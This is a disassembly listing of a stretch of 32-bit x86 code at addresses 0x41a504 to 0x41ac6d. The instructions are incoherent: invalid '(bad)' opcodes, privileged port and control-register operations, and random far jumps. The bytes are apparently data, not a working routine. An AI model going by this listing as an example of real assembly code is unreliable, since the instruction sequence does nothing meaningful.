  41a504:	cmp    dl,BYTE PTR [edx-0x56f43294]
  41a50a:	mov    eax,0xa6bf11bd
  41a50f:	in     al,0x53
  41a511:	jg     0x41a4f1
  41a513:	xchg   edx,eax
  41a514:	pop    ebx
  41a515:	daa    
  41a516:	jne    0x41a51b
  41a518:	outs   dx,BYTE PTR ds:[esi]
  41a519:	icebp  
  41a51a:	dec    esp
  41a51b:	mov    esi,0x7f11c5b7
  41a520:	retf   
  41a521:	adc    ebp,ebp
  41a523:	xchg   edx,eax
  41a524:	xchg   BYTE PTR [ecx+edx*4-0x6036ae51],al
  41a52b:	dec    ebp
  41a52c:	pop    edi
  41a52d:	sub    BYTE PTR [edi+eiz*8],0x2c
  41a531:	out    dx,al
  41a532:	inc    esp
  41a533:	dec    edi
  41a534:	std    
  41a535:	jg     0x41a4f9
  41a537:	cmp    DWORD PTR [eax],esp
  41a539:	mov    eax,ds:0x21bc7cf0
  41a53e:	jae    0x41a593
  41a540:	xchg   ebx,eax
  41a541:	mov    al,ds:0xb9986d16
  41a546:	sbb    dh,bh
  41a548:	(bad)  
  41a549:	xchg   ecx,eax
  41a54a:	mov    edx,edi
  41a54c:	cmp    ah,al
  41a54e:	lahf   
  41a54f:	xchg   edi,eax
  41a550:	or     al,0xde
  41a552:	add    DWORD PTR [esi+0x6e957e18],ebp
  41a558:	rcl    DWORD PTR [ecx+0x5f36b4b1],0x8c
  41a55f:	je     0x41a516
  41a561:	mov    ebx,0x124ef339
  41a566:	jecxz  0x41a5d8
  41a568:	sbb    DWORD PTR [ebp-0x33],ecx
  41a56b:	sub    al,dh
  41a56d:	pop    eax
  41a56e:	out    0x65,eax
  41a570:	fst    QWORD PTR [ebp-0x10]
  41a573:	or     bh,al
  41a575:	mov    ds:0x9de3623,eax
  41a57a:	dec    esp
  41a57b:	pusha  
  41a57c:	push   es
  41a57d:	mov    ecx,DWORD PTR [ebp-0x27]
  41a580:	jle    0x41a57f
  41a582:	vshufi32x4 ymm7{k3},ymm7,DWORD PTR [edx+0x1b4]{1to8},0xda
  41a58a:	push   cs
  41a58b:	mov    edx,0xe14fdc62
  41a590:	and    eax,0x27720be3
  41a595:	push   DWORD PTR [ebx+0x6a89a917]
  41a59b:	fadd   DWORD PTR [esi+edi*2+0x4]
  41a59f:	fild   WORD PTR [edi+edx*8-0x6f]
  41a5a3:	jns    0x41a61f
  41a5a5:	je     0x41a588
  41a5a7:	enter  0x591e,0x0
  41a5ab:	fstp   st(7)
  41a5ad:	loope  0x41a56e
  41a5af:	repz mov ds:0xc4373118,eax
  41a5b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5b6:	and    DWORD PTR [esi],esp
  41a5b8:	dec    esp
  41a5b9:	in     al,dx
  41a5ba:	out    dx,eax
  41a5bb:	mov    al,0x83
  41a5bd:	fbld   TBYTE PTR [esi+edx*2+0x2502b2b4]
  41a5c4:	inc    edi
  41a5c5:	jmp    0x530b8231
  41a5ca:	push   ss
  41a5cb:	push   0xedd3c49c
  41a5d0:	jp     0x41a5bb
  41a5d2:	dec    ebx
  41a5d3:	ins    DWORD PTR es:[edi],dx
  41a5d4:	sub    BYTE PTR [edx-0x172307f6],bl
  41a5da:	mov    esp,0x406c0c4
  41a5df:	xor    eax,0xa8419736
  41a5e4:	mov    ebx,0xc8b2ea2
  41a5e9:	adc    DWORD PTR [edi],ebp
  41a5eb:	rcl    BYTE PTR [esi],cl
  41a5ed:	and    eax,0xb9ba9717
  41a5f2:	imul   ebx,DWORD PTR [ecx+0x52],0xfffffff2
  41a5f6:	add    dh,BYTE PTR [ecx+edi*4+0x46]
  41a5fa:	mov    DWORD PTR [ebp+0x1645c31],0x85cc5439
  41a604:	jno    0x41a593
  41a606:	mov    edi,0x8d6d1d41
  41a60b:	test   eax,0x75a90046
  41a610:	fs dec esi
  41a612:	mov    bl,0x49
  41a614:	fnsave [ebx+0x7]
  41a617:	fidiv  WORD PTR [ecx]
  41a619:	call   0x2609:0xce30dda8
  41a620:	mov    ds:0x1a351a02,eax
  41a625:	inc    eax
  41a626:	daa    
  41a627:	cmp    DWORD PTR [ecx],ebx
  41a629:	arpl   WORD PTR [edi],sp
  41a62b:	mov    ah,0x63
  41a62d:	mov    ah,0x4d
  41a62f:	ss in  al,dx
  41a631:	pop    ds
  41a632:	push   eax
  41a633:	push   ss
  41a634:	stos   DWORD PTR es:[edi],eax
  41a635:	test   al,0x45
  41a637:	pop    ebx
  41a638:	gs cmc 
  41a63a:	test   al,0xbf
  41a63c:	sbb    eax,0x9afd8a56
  41a641:	push   eax
  41a642:	jbe    0x41a63c
  41a644:	pop    es
  41a645:	push   ecx
  41a646:	jmp    0x41a65e
  41a648:	ret    
  41a649:	sbb    DWORD PTR [esi+0x74],ebx
  41a64c:	jne    0x41a6aa
  41a64e:	rcl    DWORD PTR [eax],1
  41a650:	add    ebp,eax
  41a652:	outs   dx,DWORD PTR ds:[esi]
  41a653:	jbe    0x41a613
  41a655:	push   eax
  41a656:	xchg   esp,eax
  41a657:	dec    esi
  41a658:	icebp  
  41a659:	sti    
  41a65a:	fsubr  QWORD PTR [edx-0x9]
  41a65d:	push   edx
  41a65e:	sbb    ebx,esi
  41a660:	dec    esp
  41a661:	rcr    DWORD PTR [ebx+0x1b],0xcc
  41a665:	mov    ebp,0x8533c52f
  41a66a:	pop    edi
  41a66b:	aad    0x8a
  41a66d:	pop    ds
  41a66e:	sub    edx,0x20c197c3
  41a674:	(bad)  
  41a675:	in     al,dx
  41a676:	cmp    eax,DWORD PTR [ecx+esi*1+0x0]
  41a67a:	push   es
  41a67b:	fadd   st,st(5)
  41a67d:	(bad)  
  41a67e:	and    eax,0xde9d0627
  41a683:	(bad)  
  41a684:	outs   dx,DWORD PTR ds:[esi]
  41a685:	(bad)  
  41a686:	outs   dx,BYTE PTR ds:[esi]
  41a687:	sbb    eax,DWORD PTR [ebx+0x4ab8ba90]
  41a68d:	mov    esi,0xe193c11a
  41a692:	xchg   esp,eax
  41a693:	xchg   esi,eax
  41a694:	inc    DWORD PTR [edx+0x21]
  41a697:	cmp    al,0xa3
  41a699:	shl    BYTE PTR [ebx],cl
  41a69b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a69c:	div    BYTE PTR [esi+0x27]
  41a69f:	mov    ebx,DWORD PTR [esi+0x2f]
  41a6a2:	adc    eax,0xfa87792c
  41a6a7:	bound  ecx,QWORD PTR [ecx+edi*1+0x269711a2]
  41a6ae:	push   cs
  41a6af:	adc    BYTE PTR [eax],cl
  41a6b1:	shl    BYTE PTR [esi],cl
  41a6b3:	idiv   DWORD PTR [ecx+0x2]
  41a6b6:	iret   
  41a6b7:	or     DWORD PTR [ebp-0x13d659a4],esi
  41a6bd:	rcr    BYTE PTR [edx-0x7f],0xad
  41a6c1:	mov    esi,0xc6728c95
  41a6c6:	mov    edi,0xbeae52c5
  41a6cb:	ss sbb al,0x59
  41a6ce:	cmp    eax,0x750b9728
  41a6d3:	lods   eax,DWORD PTR ds:[esi]
  41a6d4:	mov    esp,0xefe69dc8
  41a6d9:	mov    eax,0x9dab530
  41a6de:	(bad)  
  41a6df:	call   0x16ae92b9
  41a6e4:	setbe  BYTE PTR [esi]
  41a6e7:	repz out dx,eax
  41a6e9:	into   
  41a6ea:	sar    dh,1
  41a6ec:	js     0x41a730
  41a6ee:	mov    bh,0x18
  41a6f0:	cmc    
  41a6f1:	jo     0x41a6b6
  41a6f3:	(bad)  
  41a6f4:	(bad)  
  41a6f5:	push   esi
  41a6f6:	jne    0x41a6dc
  41a6f8:	fsub   st,st(3)
  41a6fa:	jg     0x41a69e
  41a6fc:	call   0x471d:0x8080a820
  41a703:	in     al,dx
  41a704:	push   0x39150058
  41a709:	loope  0x41a723
  41a70b:	(bad)  
  41a70c:	cmp    DWORD PTR [edx],ecx
  41a70e:	sub    ebx,eax
  41a710:	xchg   edi,eax
  41a711:	sub    eax,0x617da4e1
  41a716:	clc    
  41a717:	sbb    ecx,DWORD PTR [edx]
  41a719:	mov    ecx,DWORD PTR [ebx-0x3a]
  41a71c:	dec    ecx
  41a71d:	pusha  
  41a71e:	lods   eax,DWORD PTR ds:[esi]
  41a71f:	popa   
  41a720:	mov    ds:0xf0d20813,eax
  41a725:	fwait
  41a726:	sbb    cl,al
  41a728:	loopne 0x41a745
  41a72a:	mov    DWORD PTR [ecx],ebx
  41a72c:	jne    0x41a762
  41a72e:	cli    
  41a72f:	mov    ?,WORD PTR [ecx-0x27eb1e4]
  41a735:	lahf   
  41a736:	mov    esp,0xaa10b5a5
  41a73b:	pop    ecx
  41a73c:	test   DWORD PTR [edx+0x1fb7bbdb],ebx
  41a742:	into   
  41a743:	test   esi,0xe3390459
  41a749:	xchg   BYTE PTR ds:0xdf82a431,ah
  41a74f:	mov    BYTE PTR [esi-0x63b124c7],cl
  41a755:	inc    edi
  41a756:	(bad)  
  41a757:	adc    eax,0xdbe820b2
  41a75c:	not    BYTE PTR ds:[ecx]
  41a75f:	call   0xc6e28824
  41a764:	cmp    edx,DWORD PTR [esp+eax*4+0xdf7eb25]
  41a76b:	rol    BYTE PTR [ebx+0x4e],0xb3
  41a76f:	lds    edx,FWORD PTR [ecx]
  41a771:	or     bl,bh
  41a773:	adc    eax,0xb349cdce
  41a778:	jl     0x41a7d7
  41a77a:	outs   dx,BYTE PTR ds:[esi]
  41a77b:	push   eax
  41a77c:	pop    eax
  41a77d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a77e:	sbb    al,0xe5
  41a780:	xchg   esp,eax
  41a781:	jle    0x41a7db
  41a783:	imul   ecx,esi,0x240d3251
  41a789:	mov    dl,0x25
  41a78b:	lea    edi,[eax]
  41a78d:	inc    ecx
  41a78e:	jne    0x41a7f2
  41a790:	xor    DWORD PTR [esi-0x1c],0xcadeb636
  41a797:	sbb    BYTE PTR [eax+eiz*4],bh
  41a79a:	sahf   
  41a79b:	xchg   esp,eax
  41a79c:	inc    ecx
  41a79d:	lds    ebp,FWORD PTR [ebx+ebx*8-0x7a]
  41a7a1:	adc    ch,BYTE PTR [esi-0x1a]
  41a7a4:	mov    dh,0x56
  41a7a6:	jmp    0x41a74b
  41a7a8:	and    al,ch
  41a7aa:	fst    QWORD PTR [eax+0x6076776f]
  41a7b0:	xchg   esp,eax
  41a7b1:	popa   
  41a7b2:	mov    bh,0xbc
  41a7b4:	data16 mov al,ds:0x77ac3b96
  41a7ba:	inc    edi
  41a7bb:	xchg   dh,bh
  41a7bd:	jbe    0x41a78c
  41a7bf:	xor    eax,0x8bfabc60
  41a7c4:	cmp    bh,ah
  41a7c6:	sbb    eax,0xc92efd77
  41a7cb:	stc    
  41a7cc:	cli    
  41a7cd:	sbb    ah,dh
  41a7cf:	fidivr WORD PTR [ebp-0x315958a9]
  41a7d5:	add    DWORD PTR [esi+0x57],ebx
  41a7d8:	add    ebx,DWORD PTR [ecx]
  41a7da:	cmp    ch,BYTE PTR es:0x140b6822
  41a7e1:	jl     0x41a77b
  41a7e3:	lods   eax,DWORD PTR ds:[esi]
  41a7e4:	pushf  
  41a7e5:	call   0x5ea0:0xc6160847
  41a7ec:	xchg   ebx,eax
  41a7ed:	scas   al,BYTE PTR es:[edi]
  41a7ee:	loop   0x41a782
  41a7f0:	fwait
  41a7f1:	push   cs
  41a7f2:	sbb    BYTE PTR [edi+0x3],0xaf
  41a7f6:	cdq    
  41a7f7:	scas   eax,DWORD PTR es:[edi]
  41a7f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7f9:	lds    esp,FWORD PTR ds:0x20da9c12
  41a7ff:	push   ds
  41a800:	jg     0x41a7d1
  41a802:	and    al,0xf0
  41a804:	retf   
  41a805:	lock aas 
  41a807:	sbb    eax,0x16474460
  41a80c:	add    ebp,0x169b2cc0
  41a812:	pop    esp
  41a813:	dec    esp
  41a814:	int    0x39
  41a816:	xor    cl,BYTE PTR [ecx-0xe]
  41a819:	fdivr  st,st(3)
  41a81b:	pop    ebp
  41a81c:	aam    0xdb
  41a81e:	xchg   esi,eax
  41a81f:	nop/reserved BYTE PTR [ebx]
  41a822:	or     ebp,edx
  41a824:	cmp    ch,BYTE PTR [ecx-0x4787374c]
  41a82a:	ds cld 
  41a82c:	sbb    dl,BYTE PTR [edx-0x10]
  41a82f:	(bad)  
  41a830:	mov    ebp,0x8472d390
  41a835:	leave  
  41a836:	push   ecx
  41a837:	ds jns 0x41a84b
  41a83a:	jecxz  0x41a86f
  41a83c:	sahf   
  41a83d:	jns    0x41a82c
  41a83f:	aaa    
  41a840:	sub    DWORD PTR [ebx-0x2],0xffffffb0
  41a844:	jmp    0x41a7e8
  41a846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a847:	popa   
  41a848:	xchg   esp,eax
  41a849:	lods   al,BYTE PTR ds:[esi]
  41a84a:	inc    esp
  41a84b:	xchg   BYTE PTR [eax+0x52],bh
  41a84e:	adc    edx,0xffffff99
  41a851:	sbb    DWORD PTR [eax],esi
  41a853:	mov    ebp,edx
  41a855:	mov    al,bl
  41a857:	push   eax
  41a858:	sbb    dl,ah
  41a85a:	mov    ebp,0xce3f304a
  41a85f:	xor    DWORD PTR [ebx+0x5bb29dee],edx
  41a865:	dec    esi
  41a866:	lea    edx,[eax]
  41a868:	call   0x6d6311ac
  41a86d:	pusha  
  41a86e:	push   edx
  41a86f:	arpl   WORD PTR [edx+0x55],dx
  41a872:	mov    ds:0x6da35421,al
  41a877:	sbb    dl,BYTE PTR [esi+0x46]
  41a87a:	lods   al,BYTE PTR ds:[esi]
  41a87b:	nop
  41a87c:	ins    BYTE PTR es:[edi],dx
  41a87d:	bound  esp,QWORD PTR [edi+0x2f]
  41a880:	and    edi,DWORD PTR ds:[edx]
  41a883:	mov    bh,0x60
  41a885:	jp     0x41a80d
  41a887:	jl     0x41a8d6
  41a889:	in     eax,0xcd
  41a88b:	push   0x18
  41a88d:	(bad)  
  41a88e:	mov    ds:0xa9e39e1e,eax
  41a893:	loopne 0x41a8b6
  41a895:	mov    dl,0x9f
  41a897:	aas    
  41a898:	mov    ds:0x46d9b9af,al
  41a89d:	mov    ch,0xe2
  41a89f:	mov    bh,ch
  41a8a1:	popa   
  41a8a2:	add    BYTE PTR [edi],0x68
  41a8a5:	cmc    
  41a8a6:	lock mov ah,0x54
  41a8a9:	mov    ecx,0xb8e2039
  41a8ae:	in     eax,0xb7
  41a8b0:	inc    ebx
  41a8b1:	cld    
  41a8b2:	or     al,0xfe
  41a8b4:	loop   0x41a841
  41a8b6:	lock lods al,BYTE PTR ds:[esi]
  41a8b8:	sar    BYTE PTR [ebp+ebp*4-0x79],cl
  41a8bc:	push   ebp
  41a8bd:	fst    DWORD PTR [eax]
  41a8bf:	fwait
  41a8c0:	or     BYTE PTR [ecx-0x1a83ec70],al
  41a8c6:	jns    0x41a8b0
  41a8c8:	inc    ebp
  41a8c9:	xor    al,0x98
  41a8cb:	lea    edi,[edx+ebx*2+0x2a01b96a]
  41a8d2:	inc    edx
  41a8d3:	arpl   WORD PTR [ebx+eax*4],dx
  41a8d6:	push   0x6d
  41a8d8:	push   ds
  41a8d9:	ror    DWORD PTR [edi-0x7e],cl
  41a8dc:	repz cmp bh,dl
  41a8df:	das    
  41a8e0:	bound  ebx,QWORD PTR [edi+0x4bc4f08]
  41a8e6:	leave  
  41a8e7:	or     BYTE PTR [edi-0x274541d8],ah
  41a8ed:	mov    edi,0x9987e056
  41a8f2:	das    
  41a8f3:	cs jns 0x41a884
  41a8f6:	mov    dh,0x39
  41a8f8:	outs   dx,BYTE PTR ds:[esi]
  41a8f9:	mov    eax,0xb293fd89
  41a8fe:	in     eax,0x3a
  41a900:	adc    al,0x76
  41a902:	in     al,0x8a
  41a904:	pushf  
  41a905:	loopne 0x41a95c
  41a907:	das    
  41a908:	shl    DWORD PTR [ecx+0x3d04b2c7],1
  41a90e:	inc    ebp
  41a90f:	inc    eax
  41a910:	mov    al,ds:0x448ed648
  41a915:	sbb    dl,BYTE PTR [ecx]
  41a917:	sub    esi,edx
  41a919:	jle    0x41a8d6
  41a91b:	int3   
  41a91c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a91d:	sti    
  41a91e:	ja     0x41a905
  41a920:	or     edx,DWORD PTR [edi+edx*8-0x76]
  41a924:	cmp    BYTE PTR [edx+0x0],dh
  41a927:	add    al,0x29
  41a929:	xchg   BYTE PTR [ecx+0x5943b410],bl
  41a92f:	call   0x470b4598
  41a934:	clc    
  41a935:	add    al,0x35
  41a937:	jle    0x41a91c
  41a939:	mov    ebp,0x7040f86b
  41a93e:	mov    ds:0x9ff60b26,eax
  41a943:	mov    dh,0xd6
  41a945:	les    esp,FWORD PTR [edx]
  41a947:	sbb    al,0x69
  41a949:	lock stc 
  41a94b:	cmp    DWORD PTR [ecx+esi*1+0x30],edx
  41a94f:	mov    ah,0x7a
  41a951:	jo     0x41a973
  41a953:	push   ds
  41a954:	ficom  DWORD PTR [ecx]
  41a956:	dec    esp
  41a957:	fsubrp st(4),st
  41a959:	dec    edi
  41a95a:	int    0xc8
  41a95c:	pop    ecx
  41a95d:	xchg   edx,eax
  41a95e:	fdivp  st(7),st
  41a960:	mov    BYTE PTR [eax+0x4b803460],bl
  41a966:	add    BYTE PTR [ecx+0x67],0xbe
  41a96a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a96b:	jmp    0x41a93e
  41a96d:	cmp    cl,ch
  41a96f:	mov    bl,0xab
  41a971:	out    0x83,eax
  41a973:	dec    esp
  41a974:	pop    ebx
  41a975:	inc    edi
  41a976:	dec    edi
  41a977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a978:	mov    bh,0x91
  41a97a:	loop   0x41a959
  41a97c:	fs js  0x41a933
  41a97f:	dec    ecx
  41a980:	adc    ch,bh
  41a982:	clc    
  41a983:	popa   
  41a984:	iret   
  41a985:	jmp    0xdf7c510e
  41a98a:	retf   0x6647
  41a98d:	(bad)  
  41a98e:	cli    
  41a98f:	xor    eax,0x5c7660e4
  41a994:	out    0x7d,al
  41a996:	gs dec ebx
  41a998:	lds    ecx,FWORD PTR [ecx+eiz*8-0x66]
  41a99c:	adc    edi,DWORD PTR [edi-0x5ba4b579]
  41a9a2:	adc    al,dh
  41a9a4:	xor    esp,esi
  41a9a6:	pop    ebx
  41a9a7:	or     DWORD PTR [ebp+0x2cec8647],esi
  41a9ad:	jmp    0x52462260
  41a9b2:	mov    ch,0x11
  41a9b4:	jmp    0x41aa04
  41a9b6:	jne    0x41a973
  41a9b8:	enter  0x89f4,0x57
  41a9bc:	or     DWORD PTR es:[ecx],edi
  41a9bf:	adc    dl,al
  41a9c1:	jl     0x41a96f
  41a9c3:	and    cl,al
  41a9c5:	mov    dl,0xd5
  41a9c7:	popa   
  41a9c8:	cmp    DWORD PTR [edi],ebx
  41a9ca:	cdq    
  41a9cb:	inc    esp
  41a9cc:	add    eax,0x48607686
  41a9d1:	arpl   dx,cx
  41a9d3:	push   cs
  41a9d4:	sbb    eax,0x48848bc4
  41a9d9:	data16 int3 
  41a9db:	scas   al,BYTE PTR es:[edi]
  41a9dc:	jle    0x41aa1a
  41a9de:	or     eax,0xabfa4ebf
  41a9e3:	inc    edi
  41a9e4:	pop    ebx
  41a9e5:	pop    eax
  41a9e6:	or     eax,0x597365ca
  41a9eb:	mov    dh,0x1a
  41a9ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9ee:	lea    ebx,[ebx]
  41a9f0:	das    
  41a9f1:	pop    es
  41a9f2:	cmp    al,0xdf
  41a9f4:	call   0xcb96:0xd6ccd3b4
  41a9fb:	pop    es
  41a9fc:	out    dx,eax
  41a9fd:	imul   ecx,DWORD PTR [edx+0xc92e4c3],0x4d
  41aa04:	cdq    
  41aa05:	mov    ah,0x9f
  41aa07:	push   esp
  41aa08:	jmp    0xdbe5:0x4758c353
  41aa0f:	mov    ah,0x61
  41aa11:	inc    ebx
  41aa12:	(bad)  
  41aa13:	mov    ch,0x64
  41aa15:	mov    edx,0xd55ccd03
  41aa1a:	adc    BYTE PTR [edi],bl
  41aa1c:	inc    BYTE PTR [ebx-0x29]
  41aa1f:	inc    ecx
  41aa20:	jmp    DWORD PTR [ebx-0x65497d14]
  41aa26:	cmp    BYTE PTR fs:0x8b9906ff,dl
  41aa2d:	pop    ds
  41aa2e:	cdq    
  41aa2f:	pop    ss
  41aa30:	loopne 0x41aa3c
  41aa32:	ret    0x631f
  41aa35:	jp     0x41a9ce
  41aa37:	lods   al,BYTE PTR ds:[esi]
  41aa38:	and    esi,DWORD PTR [ebx+eax*8]
  41aa3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa3c:	lds    ecx,FWORD PTR [edi-0x506975ba]
  41aa42:	daa    
  41aa43:	repnz push esp
  41aa45:	icebp  
  41aa46:	and    eax,0xcc0bb47d
  41aa4b:	jns    0x41aa0e
  41aa4d:	jmp    0x41aaa2
  41aa4f:	sub    al,0x6f
  41aa51:	mov    edx,0xa72f7d0f
  41aa56:	je     0x41aa37
  41aa58:	or     ebp,0xb8c466fb
  41aa5e:	cmp    bh,BYTE PTR [esi-0x4d6b9118]
  41aa64:	in     al,dx
  41aa65:	mov    al,0x4d
  41aa67:	retf   0x71a0
  41aa6a:	lea    esi,[eax+0x63]
  41aa6d:	add    eax,0x7377a69
  41aa72:	idiv   edi
  41aa74:	jno    0x41aa6d
  41aa76:	in     eax,dx
  41aa77:	bound  ebp,QWORD PTR [edx]
  41aa79:	push   cs
  41aa7a:	mov    cr3,edi
  41aa7d:	xchg   esi,eax
  41aa7e:	fdiv   QWORD PTR [ecx]
  41aa80:	dec    edi
  41aa81:	nop
  41aa82:	ds (bad) 
  41aa84:	sar    DWORD PTR [edi],1
  41aa86:	fsubr  st(3),st
  41aa88:	nop
  41aa89:	cdq    
  41aa8a:	lock stos BYTE PTR es:[edi],al
  41aa8c:	mov    eax,ds:0xd69c81f
  41aa91:	retf   
  41aa92:	fstp   TBYTE PTR [ebx-0x8]
  41aa95:	inc    ecx
  41aa96:	xor    ebp,0x12
  41aa99:	inc    esi
  41aa9a:	mov    ah,0x76
  41aa9c:	in     eax,0xe6
  41aa9e:	icebp  
  41aa9f:	or     al,0x5f
  41aaa1:	sub    ebx,ecx
  41aaa3:	adc    DWORD PTR [esi-0x5407549b],esi
  41aaa9:	outs   dx,DWORD PTR ds:[esi]
  41aaaa:	mov    ebx,0x47422ffd
  41aaaf:	es addr16 push 0xfffffff0
  41aab3:	sbb    BYTE PTR [ebp+0x76],ch
  41aab6:	xchg   DWORD PTR ds:0xee6d0179,edx
  41aabc:	popa   
  41aabd:	out    0xa2,al
  41aabf:	jmp    0xa1ca:0xc28d1e3
  41aac6:	jecxz  0x41aaee
  41aac8:	dec    esi
  41aac9:	xchg   cl,al
  41aacb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aacc:	xor    ebp,DWORD PTR [eax-0xb773932]
  41aad2:	neg    DWORD PTR [ecx+edi*4]
  41aad5:	jbe    0x41aa81
  41aad7:	lods   al,BYTE PTR ds:[esi]
  41aad8:	mov    ebp,0xe57b2f68
  41aadd:	cdq    
  41aade:	dec    edx
  41aadf:	(bad)  
  41aae0:	push   ss
  41aae1:	xchg   edx,eax
  41aae2:	retf   
  41aae3:	add    eax,0xf8c297a9
  41aae8:	pop    ds
  41aae9:	mov    dh,0x5e
  41aaeb:	jmp    0x41ab2a
  41aaed:	outs   dx,BYTE PTR ds:[esi]
  41aaee:	jae    0x41aa8e
  41aaf0:	mov    ds:0xc133074f,eax
  41aaf5:	jmp    0x91cb:0x9e715e86
  41aafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aafd:	in     eax,0x82
  41aaff:	jle    0x41aacb
  41ab01:	inc    ebx
  41ab02:	push   ebx
  41ab03:	or     BYTE PTR [esi-0x4a],dl
  41ab06:	gs (bad) 
  41ab08:	xchg   esi,eax
  41ab09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab0a:	clc    
  41ab0b:	mov    al,ds:0xbe0f2a9
  41ab10:	bound  ebx,QWORD PTR [esp+esi*4]
  41ab13:	add    eax,0xd70007e6
  41ab18:	mov    al,ds:0xb71f3b47
  41ab1d:	pop    ecx
  41ab1e:	mov    edx,0xd4c14af8
  41ab23:	scas   al,BYTE PTR es:[edi]
  41ab24:	loope  0x41ab40
  41ab26:	xchg   BYTE PTR [esi+0x7ddd341c],dl
  41ab2c:	mov    esp,0x61ae480f
  41ab31:	and    ebx,0xfffffff6
  41ab34:	xor    al,0xc8
  41ab36:	dec    esi
  41ab37:	xor    BYTE PTR [edi],0x7e
  41ab3a:	retf   0x5ea0
  41ab3d:	je     0x41ab71
  41ab3f:	sbb    DWORD PTR [edx+0x1f],edi
  41ab42:	add    al,0x1a
  41ab44:	dec    edx
  41ab45:	pop    ebx
  41ab46:	mov    bh,0x91
  41ab48:	cmp    DWORD PTR [edx],0xffffff9e
  41ab4b:	ja     0x41ab3f
  41ab4d:	or     cl,cl
  41ab4f:	sbb    DWORD PTR [eax-0x6ff4d8d2],edx
  41ab55:	stos   BYTE PTR es:[edi],al
  41ab56:	loop   0x41abd4
  41ab58:	jns    0x41ab50
  41ab5a:	dec    esi
  41ab5b:	fsubrp st(7),st
  41ab5d:	ret    0x3dd5
  41ab60:	sub    BYTE PTR [bx+di],ch
  41ab63:	int    0xf8
  41ab65:	loope  0x41abe5
  41ab67:	scas   al,BYTE PTR es:[edi]
  41ab68:	pop    esp
  41ab69:	xor    eax,0xeb8e5cf9
  41ab6e:	movzx  esp,dx
  41ab71:	inc    eax
  41ab72:	mov    dh,0xdc
  41ab74:	and    ebx,DWORD PTR [ebx+0x2c]
  41ab77:	scas   eax,DWORD PTR es:[edi]
  41ab78:	mov    bl,BYTE PTR [ebp-0x45a41c24]
  41ab7e:	clc    
  41ab7f:	lods   al,BYTE PTR ds:[esi]
  41ab80:	adc    dl,BYTE PTR [edx+0x6a]
  41ab83:	and    DWORD PTR [esi],edi
  41ab85:	xor    ebx,edx
  41ab87:	scas   al,BYTE PTR es:[edi]
  41ab88:	aam    0x58
  41ab8a:	in     al,dx
  41ab8b:	das    
  41ab8c:	dec    edi
  41ab8d:	fisttp WORD PTR [eax+0x52fcdf2f]
  41ab93:	xchg   ebx,eax
  41ab94:	ret    0x6017
  41ab97:	jns    0x41ac0c
  41ab99:	mov    dh,0xe2
  41ab9b:	jo     0x41ab58
  41ab9d:	ret    0x9f7e
  41aba0:	push   0x77279b09
  41aba5:	sub    BYTE PTR [esi-0x7b],al
  41aba8:	sbb    DWORD PTR [edi],0x7488fbfe
  41abae:	bound  esi,QWORD PTR [edx-0x1bde4d87]
  41abb4:	repnz fwait
  41abb6:	inc    ebx
  41abb7:	ret    
  41abb8:	ja     0x41aba5
  41abba:	mov    ebp,0x32860e04
  41abbf:	(bad)  
  41abc1:	jbe    0x41ac41
  41abc3:	mov    ebx,0xfef367fd
  41abc8:	repz bnd jno 0x41ac1c
  41abcc:	shl    DWORD PTR [eax-0x5a09032],0x37
  41abd3:	mov    ds:0xf43c4f9a,al
  41abd8:	dec    edi
  41abd9:	pushf  
  41abda:	into   
  41abdb:	jae    0x41ac0a
  41abdd:	loop   0x41abc3
  41abdf:	jle    0x41ac4d
  41abe1:	xchg   edi,eax
  41abe2:	sete   BYTE PTR [ebx]
  41abe5:	scas   eax,DWORD PTR es:[edi]
  41abe6:	mov    ch,0xf1
  41abe8:	pop    ebx
  41abe9:	aas    
  41abea:	enter  0xb8c1,0x39
  41abee:	(bad)  [ecx+0x35]
  41abf1:	push   es
  41abf2:	mov    DWORD PTR [ebx],edx
  41abf4:	cmp    dh,BYTE PTR fs:[ebx+ebp*4+0x623c4691]
  41abfc:	sbb    al,0xc8
  41abfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abff:	imul   BYTE PTR [eax]
  41ac01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac02:	out    0x17,eax
  41ac04:	jmp    0x4e240c75
  41ac09:	mov    ch,0x54
  41ac0b:	lods   eax,DWORD PTR ds:[esi]
  41ac0c:	push   ebp
  41ac0d:	cmp    bl,dh
  41ac0f:	adc    DWORD PTR es:[edx+0x17],esi
  41ac13:	sbb    cl,BYTE PTR ds:0xfc3d83b8
  41ac19:	adc    al,BYTE PTR [ebx+0x3f]
  41ac1c:	sub    al,al
  41ac1e:	sti    
  41ac1f:	cmp    cl,dh
  41ac21:	add    BYTE PTR [ebx+0x23],cl
  41ac24:	mov    al,0xae
  41ac26:	in     al,dx
  41ac27:	pop    es
  41ac28:	and    BYTE PTR [eax-0x7b],ah
  41ac2b:	jl     0x41ac1a
  41ac2d:	and    ebp,DWORD PTR [edx-0x389d454c]
  41ac33:	pop    eax
  41ac34:	push   eax
  41ac35:	mov    esi,0x99387bd6
  41ac3a:	fsubr  DWORD PTR [eax+0x41]
  41ac3d:	or     BYTE PTR [ebx+0x3c],0xc2
  41ac41:	mov    eax,ds:0x70fd2223
  41ac46:	mov    ebx,0x176a1887
  41ac4b:	xchg   esi,eax
  41ac4c:	cli    
  41ac4d:	std    
  41ac4e:	cmp    esp,DWORD PTR [ebp+0x658a0e85]
  41ac54:	aam    0xd2
  41ac56:	xchg   ecx,eax
  41ac57:	in     al,0x0
  41ac59:	imul   edi,ebp,0x30ff14d9
  41ac5f:	cli    
  41ac60:	sbb    eax,0xa650fd7f
  41ac65:	pop    ds
  41ac66:	in     eax,dx
  41ac67:	mov    es,WORD PTR [edi]
  41ac69:	in     eax,0xec
  41ac6b:	add    ebx,eax
  41ac6d:	cmp    al,0x92
